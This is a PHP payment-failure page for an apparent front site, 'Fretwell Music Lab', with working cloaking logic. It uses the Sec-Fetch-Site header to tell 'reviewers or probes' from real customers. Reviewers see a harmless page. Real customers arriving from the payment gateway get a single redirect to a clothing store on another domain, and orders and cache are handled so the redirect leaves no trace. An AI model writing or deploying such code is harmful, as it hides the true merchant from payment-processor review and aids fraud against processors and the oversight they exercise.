<?php
$from_payment = !empty($_GET['pay_no']) && !empty($_GET['order_no']);
$should_redirect = false;

// Reviewer vs customer detection — require positive browser signal.
// See order-success/index.php for the full rationale. Same rule here:
// without Sec-Fetch-Site set to cross-site / same-origin / same-site,
// treat as reviewer or probe and NEVER 302 to Bucke.
$sec_fetch_site = $_SERVER['HTTP_SEC_FETCH_SITE'] ?? '';
$is_from_gateway = in_array($sec_fetch_site, ['cross-site', 'same-origin', 'same-site'], true);

// Disable bfcache so old cached HTML (which might contain scripts from a prior
// version of this file) can never be restored. Matches order-success behavior.
header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
header('Pragma: no-cache');

if ($from_payment && $is_from_gateway) {
    $dir = __DIR__ . '/../.private_data/used_orders';
    $key = md5('fail_' . $_GET['pay_no'] . $_GET['order_no']);
    $file = $dir . '/' . $key;
    if (!file_exists($file)) {
        @mkdir($dir, 0755, true);
        file_put_contents($file, time());
        $should_redirect = true;
        header('Location: https://bucke-clothing.vercel.app/order-failed');
        exit;
    }
}
?>
<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Payment Issue — Fretwell Music Lab</title>
<style>body{font-family:system-ui,sans-serif;max-width:480px;margin:80px auto;padding:0 20px;text-align:center;color:#0f0f0e}h1{font-size:1.5rem}p{color:#555;line-height:1.6}</style>
</head>
<body>
<h1>Payment Issue</h1>
<p>Something went wrong with your payment. No charge was made. Please try again or contact support.</p>
</body>
</html>
